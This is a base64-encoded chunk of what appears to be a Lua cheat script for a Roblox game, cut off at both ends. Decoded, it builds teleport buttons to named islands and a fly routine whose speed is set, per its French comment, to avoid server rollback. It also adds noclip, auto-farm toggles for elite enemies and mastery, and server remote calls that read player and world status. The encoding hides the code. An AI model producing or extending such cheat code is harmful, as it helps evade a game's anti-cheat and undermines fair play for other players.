vdGhhbUJvbGQKICAgIExhYkJ0bi5UZXh0U2l6ZSA9IDkKICAgIExhYkJ0bi5UZXh0ID0gIlRlbGVwb3J0IHRvIExhYiIKICAgIExhYkJ0bi5QYXJlbnQgPSBMYWJGcmFtZQogICAgCiAgICBMYWJCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgaWYgY2hhcmFjdGVyIGFuZCByb290UGFydCB0aGVuCiAgICAgICAgICAgIHN0b3BUZWxlcG9ydCgpCiAgICAgICAgICAgIGN1cnJlbnRUZWxlcG9ydFRocmVhZCA9IHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgcm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5MjYuMDAsIDEyNC4xNiwgMzI4MzguNzApCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLS0gMi4gUG9zaXRpb24gZGUgZMOpcGFydCBkdSBGbHkKICAgICAgICAgICAgICAgIGxvY2FsIHN0YXJ0UG9zID0gVmVjdG9yMy5uZXcoLTY1MDguNDQsIDg0Ljg1LCAtMTMzLjQ4KQogICAgICAgICAgICAgICAgbG9jYWwgZW5kUG9zID0gVmVjdG9yMy5uZXcoLTUzNTQuMDQsIDI4MS40OCwgLTU4MjYuODApCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIGNoYXJhY3RlciBhbmQgcm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgIHJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoc3RhcnRQb3MpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tIDMuIEZseSB2ZXJzIGxhIGRlc3RpbmF0aW9uIChUd2VlbikKICAgICAgICAgICAgICAgIGlmIGNoYXJhY3RlciBhbmQgcm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGRpc3QgPSAoZW5kUG9zIC0gc3RhcnRQb3MpLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHNwZWVkID0gMjc1IC0tIFZpdGVzc2UgbW9kw6lyw6llIHBvdXIgw6l2aXRlciBsZSByb2xsYmFjawogICAgICAgICAgICAgICAgICAgIGxvY2FsIGR1cmF0aW9uID0gZGlzdCAvIHNwZWVkCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgLS0gU2V0dXAgQW50aS1HcmF2aXR5CiAgICAgICAgICAgICAgICAgICAgbG9jYWwgYnYgPSBJbnN0YW5jZS5uZXcoIkJvZHlWZWxvY2l0eSIpCiAgICAgICAgICAgICAgICAgICAgYnYuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLDAsMCkKICAgICAgICAgICAgICAgICAgICBidi5NYXhGb3JjZSA9IFZlY3RvcjMubmV3KG1hdGguaHVnZSwgbWF0aC5odWdlLCBtYXRoLmh1Z2UpCiAgICAgICAgICAgICAgICAgICAgYnYuUGFyZW50ID0gcm9vdFBhcnQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsb2NhbCB0d2VlbkluZm8gPSBUd2VlbkluZm8ubmV3KGR1cmF0aW9uLCBFbnVtLkVhc2luZ1N0eWxlLkxpbmVhcikKICAgICAgICAgICAgICAgICAgICBsb2NhbCB0d2VlbiA9IFR3ZWVuU2VydmljZTpDcmVhdGUocm9vdFBhcnQsIHR3ZWVuSW5mbywge0NGcmFtZSA9IENGcmFtZS5uZXcoZW5kUG9zKX0pCiAgICAgICAgICAgICAgICAgICAgY3VycmVudFRlbGVwb3J0VHdlZW4gPSB0d2VlbgogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHR3ZWVuOlBsYXkoKQogICAgICAgICAgICAgICAgICAgIHR3ZWVuLkNvbXBsZXRlZDpXYWl0KCkKICAgICAgICAgICAgICAgICAgICBjdXJyZW50VGVsZXBvcnRUd2VlbiA9IG5pbAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIGJ2IHRoZW4gYnY6RGVzdHJveSgpIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBjdXJyZW50VGVsZXBvcnRUaHJlYWQgPSBuaWwKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kKQogICAgZW5kCiAgICAKICAgIGNyZWF0ZVNlY3Rpb24oUGFnZXMuVGVsZXBvcnQsICJUZWxlcG9ydCBTZWEgMyIsIDkpCiAgICAKICAgIGRvCiAgICBsb2NhbCBTZWFDYXN0bGVGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgU2VhQ2FzdGxlRnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgIFNlYUNhc3RsZUZyYW1lLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMCwgMjAsIDI1KQogICAgU2VhQ2FzdGxlRnJhbWUuTGF5b3V0T3JkZXIgPSAxMwogICAgU2VhQ2FzdGxlRnJhbWUuUGFyZW50ID0gUGFnZXMuVGVsZXBvcnQKCiAgICBsb2NhbCBTZWFDYXN0bGVDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKICAgIFNlYUNhc3RsZUNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAzKQogICAgU2VhQ2FzdGxlQ29ybmVyLlBhcmVudCA9IFNlYUNhc3RsZUZyYW1lCiAgICAKICAgIGxvY2FsIFNlYUNhc3RsZUJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICBTZWFDYXN0bGVCdG4uU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAxLCAwKQogICAgU2VhQ2FzdGxlQnRuLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBTZWFDYXN0bGVCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICBTZWFDYXN0bGVCdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICBTZWFDYXN0bGVCdG4uVGV4dFNpemUgPSA5CiAgICBTZWFDYXN0bGVCdG4uVGV4dCA9ICJUZWxlcG9ydCB0byBTZWEgQ2FzdGxlIgogICAgU2VhQ2FzdGxlQnRuLlBhcmVudCA9IFNlYUNhc3RsZUZyYW1lCiAgICAKICAgIFNlYUNhc3RsZUJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBpZiBjaGFyYWN0ZXIgYW5kIHJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgc3RvcFRlbGVwb3J0KCkKICAgICAgICAgICAgcm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtMTI0NjQuMjEsIDM3NS40MSwgLTc1NjEuNzApCiAgICAgICAgZW5kCiAgICBlbmQpCiAgICBlbmQKCiAgICBkbwogICAgbG9jYWwgVHVydGxlRnJhbWUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgIFR1cnRsZUZyYW1lLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICBUdXJ0bGVGcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAsIDIwLCAyNSkKICAgIFR1cnRsZUZyYW1lLkxheW91dE9yZGVyID0gMTIKICAgIFR1cnRsZUZyYW1lLlBhcmVudCA9IFBhZ2VzLlRlbGVwb3J0CgogICAgbG9jYWwgVHVydGxlQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCiAgICBUdXJ0bGVDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMykKICAgIFR1cnRsZUNvcm5lci5QYXJlbnQgPSBUdXJ0bGVGcmFtZQogICAgCiAgICBsb2NhbCBUdXJ0bGVCdG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgVHVydGxlQnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMSwgMCkKICAgIFR1cnRsZUJ0bi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgVHVydGxlQnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgVHVydGxlQnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgVHVydGxlQnRuLlRleHRTaXplID0gOQogICAgVHVydGxlQnRuLlRleHQgPSAiVGVsZXBvcnQgdG8gVHVydGxlIgogICAgVHVydGxlQnRuLlBhcmVudCA9IFR1cnRsZUZyYW1lCiAgICAKICAgIFR1cnRsZUJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBpZiBjaGFyYWN0ZXIgYW5kIHJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgc3RvcFRlbGVwb3J0KCkKICAgICAgICAgICAgcm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtNTA1OS45MCwgMzE1LjU5LCAtMzE4OS4xMSkKICAgICAgICBlbmQKICAgIGVuZCkKICAgIGVuZAoKICAgIGRvCiAgICBsb2NhbCBIeWRyYUZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICBIeWRyYUZyYW1lLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICBIeWRyYUZyYW1lLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMCwgMjAsIDI1KQogICAgSHlkcmFGcmFtZS5MYXlvdXRPcmRlciA9IDExCiAgICBIeWRyYUZyYW1lLlBhcmVudCA9IFBhZ2VzLlRlbGVwb3J0CgogICAgbG9jYWwgSHlkcmFDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKICAgIEh5ZHJhQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDMpCiAgICBIeWRyYUNvcm5lci5QYXJlbnQgPSBIeWRyYUZyYW1lCiAgICAKICAgIGxvY2FsIEh5ZHJhQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgIEh5ZHJhQnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMSwgMCkKICAgIEh5ZHJhQnRuLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBIeWRyYUJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgIEh5ZHJhQnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgSHlkcmFCdG4uVGV4dFNpemUgPSA5CiAgICBIeWRyYUJ0bi5UZXh0ID0gIlRlbGVwb3J0IHRvIEh5ZHJhIgogICAgSHlkcmFCdG4uUGFyZW50ID0gSHlkcmFGcmFtZQogICAgCiAgICBIeWRyYUJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBpZiBjaGFyYWN0ZXIgYW5kIHJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgc3RvcFRlbGVwb3J0KCkKICAgICAgICAgICAgcm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtNTAyNC4zMSwgMzE1LjU5LCAtMzIwMi45OSkKICAgICAgICBlbmQKICAgIGVuZCkKICAgIGVuZAoKICAgIGRvCiAgICBsb2NhbCBUaWtpRnJhbWUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgIFRpa2lGcmFtZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDMwKQogICAgVGlraUZyYW1lLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMCwgMjAsIDI1KQogICAgVGlraUZyYW1lLkxheW91dE9yZGVyID0gMTAKICAgIFRpa2lGcmFtZS5QYXJlbnQgPSBQYWdlcy5UZWxlcG9ydAoKICAgIGxvY2FsIFRpa2lDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKICAgIFRpa2lDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMykKICAgIFRpa2lDb3JuZXIuUGFyZW50ID0gVGlraUZyYW1lCiAgICAKICAgIGxvY2FsIFRpa2lCdG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgVGlraUJ0bi5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApCiAgICBUaWtpQnRuLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBUaWtpQnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgVGlraUJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgIFRpa2lCdG4uVGV4dFNpemUgPSA5CiAgICBUaWtpQnRuLlRleHQgPSAiVGVsZXBvcnQgdG8gVGlraSIKICAgIFRpa2lCdG4uUGFyZW50ID0gVGlraUZyYW1lCiAgICAKICAgIFRpa2lCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgaWYgY2hhcmFjdGVyIGFuZCByb290UGFydCB0aGVuCiAgICAgICAgICAgIHN0b3BUZWxlcG9ydCgpCiAgICAgICAgICAgIHJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoLTUwOTcuNzMsIDMxNS41OCwgLTMxNzcuNjgpCiAgICAgICAgZW5kCiAgICBlbmQpCiAgICBlbmQKICAgIAogICAgLS0gRmFybSBQYWdlIENvbnRlbnQKICAgIGNyZWF0ZVNlY3Rpb24oUGFnZXMuRmFybVN0YXR1cywgIlN0YXR1cyIsIDAuMDUpCiAgICAKICAgIGRvCiAgICAgICAgbG9jYWwgU3RhdHVzRnJhbWUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgICAgICBTdGF0dXNGcmFtZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDEyMCkKICAgICAgICBTdGF0dXNGcmFtZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgIFN0YXR1c0ZyYW1lLkxheW91dE9yZGVyID0gMC4wNgogICAgICAgIFN0YXR1c0ZyYW1lLlBhcmVudCA9IFBhZ2VzLkZhcm1TdGF0dXMKICAgICAgICAKICAgICAgICBsb2NhbCBVSUxpc3QgPSBJbnN0YW5jZS5uZXcoIlVJTGlzdExheW91dCIpCiAgICAgICAgVUlMaXN0LlBhcmVudCA9IFN0YXR1c0ZyYW1lCiAgICAgICAgVUlMaXN0LlBhZGRpbmcgPSBVRGltLm5ldygwLCAyKQogICAgICAgIAogICAgICAgIGxvY2FsIGZ1bmN0aW9uIGNyZWF0ZVN0YXR1c0xhYmVsKHRleHQpCiAgICAgICAgICAgIGxvY2FsIGwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICAgICAgICAgIGwuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAxNSkKICAgICAgICAgICAgbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICBsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjAwKQogICAgICAgICAgICBsLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtCiAgICAgICAgICAgIGwuVGV4dFNpemUgPSAxMAogICAgICAgICAgICBsLlRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0CiAgICAgICAgICAgIGwuVGV4dCA9IHRleHQKICAgICAgICAgICAgbC5QYXJlbnQgPSBTdGF0dXNGcmFtZQogICAgICAgICAgICByZXR1cm4gbAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIERpbUxhYmVsID0gY3JlYXRlU3RhdHVzTGFiZWwoIkRpbWVuc2lvbjogPyIpCiAgICAgICAgbG9jYWwgQm9uZUxhYmVsID0gY3JlYXRlU3RhdHVzTGFiZWwoIkJvbmVzOiA/IikKICAgICAgICBsb2NhbCBFbGl0ZUxhYmVsID0gY3JlYXRlU3RhdHVzTGFiZWwoIkVsaXRlOiA/IikKICAgICAgICBsb2NhbCBNaXJhZ2VMYWJlbCA9IGNyZWF0ZVN0YXR1c0xhYmVsKCJNaXJhZ2U6ID8iKQogICAgICAgIGxvY2FsIEtpdHN1bmVMYWJlbCA9IGNyZWF0ZVN0YXR1c0xhYmVsKCJLaXRzdW5lOiA/IikKICAgICAgICBsb2NhbCBNb29uTGFiZWwgPSBjcmVhdGVTdGF0dXNMYWJlbCgiTW9vbjogPyIpCiAgICAgICAgbG9jYWwgU3dvcmRMYWJlbCA9IGNyZWF0ZVN0YXR1c0xhYmVsKCJMZWdlbmRhcnkgU3dvcmQ6ID8iKQogICAgICAgIAogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBDb25maWcuSXNSdW5uaW5nIGRvCiAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgLS0gRGltZW5zaW9uCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgZGltID0gIk5vbmUiCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY2FrZVNwYXduZXIgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUmVtb3Rlcy5Db21tRl86SW52b2tlU2VydmVyKCJDYWtlUHJpbmNlU3Bhd25lciIsIHRydWUpCiAgICAgICAgICAgICAgICAgICAgaWYgY2FrZVNwYXduZXIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBjb3VudCA9IHN0cmluZy5tYXRjaChjYWtlU3Bhd25lciwgIiVkKyIpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNvdW50IHRoZW4gZGltID0gIk5lZWQgTW9yZTogIiAuLiBjb3VudAogICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYgc3RyaW5nLmZpbmQoY2FrZVNwYXduZXIsICJEbyB5b3Ugd2FudCB0byBvcGVuIikgdGhlbiBkaW0gPSAiUmVhZHkhIiBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBEaW1MYWJlbC5UZXh0ID0gIkEgRGltZW5zaW9uOiAiIC4uIGRpbQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIC0tIEJvbmVzCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgYm9uZXMgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUmVtb3Rlcy5Db21tRl86SW52b2tlU2VydmVyKCJCb25lcyIsICJDaGVjayIpIG9yIDAKICAgICAgICAgICAgICAgICAgICBCb25lTGFiZWwuVGV4dCA9ICJCb25lIFlvdSBIYXZlOiAiIC4uIGJvbmVzCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgLS0gRWxpdGUKICAgICAgICAgICAgICAgICAgICBsb2NhbCBlbGl0ZSA9ICLwn5S0IgogICAgICAgICAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKTpGaW5kRmlyc3RDaGlsZCgiRGlhYmxvIikgb3IgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOkZpbmRGaXJzdENoaWxkKCJEZWFuZHJlIikgb3IgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOkZpbmRGaXJzdENoaWxkKCJVcmJhbiIpIG9yIHdvcmtzcGFjZS5FbmVtaWVzOkZpbmRGaXJzdENoaWxkKCJEaWFibG8iKSBvciB3b3Jrc3BhY2UuRW5lbWllczpGaW5kRmlyc3RDaGlsZCgiRGVhbmRyZSIpIG9yIHdvcmtzcGFjZS5FbmVtaWVzOkZpbmRGaXJzdENoaWxkKCJVcmJhbiIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZWxpdGUgPSAi8J+foiIKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBFbGl0ZUxhYmVsLlRleHQgPSAiRWxpdGU6ICIgLi4gZWxpdGUKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAtLSBNaXJhZ2UKICAgICAgICAgICAgICAgICAgICBsb2NhbCBtaXJhZ2UgPSAi8J+UtCIKICAgICAgICAgICAgICAgICAgICBpZiB3b3Jrc3BhY2UuX1dvcmxkT3JpZ2luLkxvY2F0aW9uczpGaW5kRmlyc3RDaGlsZCgiTWlyYWdlIElzbGFuZCIpIHRoZW4gbWlyYWdlID0gIvCfn6IiIGVuZAogICAgICAgICAgICAgICAgICAgIE1pcmFnZUxhYmVsLlRleHQgPSAiTWlyYWdlIElzbGFuZDogIiAuLiBtaXJhZ2UKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAtLSBLaXRzdW5lCiAgICAgICAgICAgICAgICAgICAgbG9jYWwga2l0c3VuZSA9ICLwn5S0IgogICAgICAgICAgICAgICAgICAgIGlmIHdvcmtzcGFjZS5fV29ybGRPcmlnaW4uTG9jYXRpb25zOkZpbmRGaXJzdENoaWxkKCJLaXRzdW5lIElzbGFuZCIpIHRoZW4ga2l0c3VuZSA9ICLwn5+iIiBlbmQKICAgICAgICAgICAgICAgICAgICBLaXRzdW5lTGFiZWwuVGV4dCA9ICJLaXRzdW5lIElzbGFuZDogIiAuLiBraXRzdW5lCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgLS0gTW9vbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIG1vb25UeHQgPSAiTm8gRnVsbCBNb29uIgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGxpZ2h0aW5nID0gZ2FtZTpHZXRTZXJ2aWNlKCJMaWdodGluZyIpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgbW9vbklkID0gKGdhbWUuUGxhY2VJZCA9PSAyNzUzOTE1NTQ5IG9yIGdhbWUuUGxhY2VJZCA9PSA0NDQyMjcyMTgzKSBhbmQgbGlnaHRpbmcuRmFudGFzeVNreS5Nb29uVGV4dHVyZUlkIG9yIGxpZ2h0aW5nLlNreS5Nb29uVGV4dHVyZUlkCiAgICAgICAgICAgICAgICAgICAgaWYgbW9vbklkID09ICJodHRwOi8vd3d3LnJvYmxveC5jb20vYXNzZXQvP2lkPTk3MDkxNDk0MzEiIG9yIG1vb25JZCA9PSAiaHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD00MzAzMjA3OTYyIiB0aGVuIG1vb25UeHQgPSAiRnVsbCBNb29uIgogICAgICAgICAgICAgICAgICAgIGVsc2VpZiBtb29uSWQgPT0gImh0dHA6Ly93d3cucm9ibG94LmNvbS9hc3NldC8/aWQ9OTcwOTE0OTA1MiIgdGhlbiBtb29uVHh0ID0gIk5leHQgTmlnaHQiIGVuZAogICAgICAgICAgICAgICAgICAgIE1vb25MYWJlbC5UZXh0ID0gIk1vb246ICIgLi4gbW9vblR4dAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIC0tIExlZ2VuZGFyeSBTd29yZAogICAgICAgICAgICAgICAgICAgIGxvY2FsIHN3b3JkID0gIvCflLQiCiAgICAgICAgICAgICAgICAgICAgaWYgZ2FtZS5QbGFjZUlkID09IDQ0NDIyNzIxODMgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBzRGF0YSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SZW1vdGVzLkNvbW1GXzpJbnZva2VTZXJ2ZXIoIkxlZ2VuZGFyeVN3b3JkRGVhbGVyIiwgIjEiKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBzRGF0YSBhbmQgc0RhdGEgfj0gIjEiIHRoZW4gc3dvcmQgPSBzRGF0YSBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBTd29yZExhYmVsLlRleHQgPSAiTGVnZW5kYXJ5IFN3b3JkOiAiIC4uIHN3b3JkCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCgogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5GYXJtRmFybWluZywgIkZhcm1pbmciLCAwLjA3KQogICAgCiAgICAtLSBNb3ZlIEZhcm0gTmVhcmVzdCBIZXJlCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuRmFybUZhcm1pbmcsICJFbmFibGUgRmFybSBOZWFyZXN0IiwgIkN1c3RvbUZhcm1OZWFyZXN0IiwgMC4wOCkKICAgIAogICAgLS0gTW92ZSBNYXN0" .. "ZXJ5IEZhcm0gSGVyZQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLkZhcm1GYXJtaW5nLCAiRW5hYmxlIE1hc3RlcnkgRmFybSIsICJNYXN0ZXJ5RmFybSIsIDAuMDkpCiAgICAKICAgIC0tIEF1dG8gRmFybSBFbGl0ZQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLkZhcm1GYXJtaW5nLCAiQXV0byBGYXJtIEVsaXRlIiwgIkF1dG9FbGl0ZWh1bnRlciIsIDAuMTApCgogICAgLS0gRm9yd2FyZCBkZWNsYXJhdGlvbiBmb3IgRmFzdCBNMQogICAgbG9jYWwgU3RhcnRGYXN0TTEsIEZhc3RNMUJ0bgogICAgCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBmdW5jdGlvbiBUd2VlblRvRWxpdGUodGFyZ2V0UG9zKQogICAgICAgICAgICBpZiBub3Qgcm9vdFBhcnQgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIGxvY2FsIGRpc3QgPSAocm9vdFBhcnQuUG9zaXRpb24gLSB0YXJnZXRQb3MpLk1hZ25pdHVkZQogICAgICAgICAgICBpZiBkaXN0IDwgMjUgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBzcGVlZCA9IDQwMAogICAgICAgICAgICBsb2NhbCBpbmZvID0gVHdlZW5JbmZvLm5ldyhkaXN0IC8gc3BlZWQsIEVudW0uRWFzaW5nU3R5bGUuTGluZWFyKQogICAgICAgICAgICBsb2NhbCB0d2VlbiA9IFR3ZWVuU2VydmljZTpDcmVhdGUocm9vdFBhcnQsIGluZm8sIHtDRnJhbWUgPSBDRnJhbWUubmV3KHRhcmdldFBvcyl9KQogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgbm9jbGlwQ29ubiA9IFJ1blNlcnZpY2UuU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGlmIGNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMoY2hhcmFjdGVyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHY6SXNBKCJCYXNlUGFydCIpIHRoZW4gdi5DYW5Db2xsaWRlID0gZmFsc2UgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAKICAgICAgICAgICAgdHdlZW46UGxheSgpCiAgICAgICAgICAgIAogICAgICAgICAgICB3aGlsZSB0d2Vlbi5QbGF5YmFja1N0YXRlID09IEVudW0uUGxheWJhY2tTdGF0ZS5QbGF5aW5nIGRvCiAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLklzUnVubmluZyBvciBub3QgQ29uZmlnLkF1dG9FbGl0ZWh1bnRlciB0aGVuIHR3ZWVuOkNhbmNlbCgpIGJyZWFrIGVuZAogICAgICAgICAgICAgICAgaWYgbm90IHJvb3RQYXJ0IG9yIChodW1hbm9pZCBhbmQgaHVtYW5vaWQuSGVhbHRoIDw9IDApIHRoZW4gdHdlZW46Q2FuY2VsKCkgYnJlYWsgZW5kCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wMykKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBub2NsaXBDb25uIHRoZW4gbm9jbGlwQ29ubjpEaXNjb25uZWN0KCkgZW5kCiAgICAgICAgICAgIGlmIHJvb3RQYXJ0IHRoZW4gcm9vdFBhcnQuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLDAsMCkgZW5kCiAgICAgICAgZW5kCgogICAgICAgIC0tIEZ1bmN0aW9uIHRvIGVxdWlwIG1lbGVlIHdlYXBvbgogICAgICAgIGxvY2FsIGZ1bmN0aW9uIEVxdWlwTWVsZWVXZWFwb24oKQogICAgICAgICAgICBpZiBub3QgcGxheWVyLkNoYXJhY3RlciBvciBub3Qgc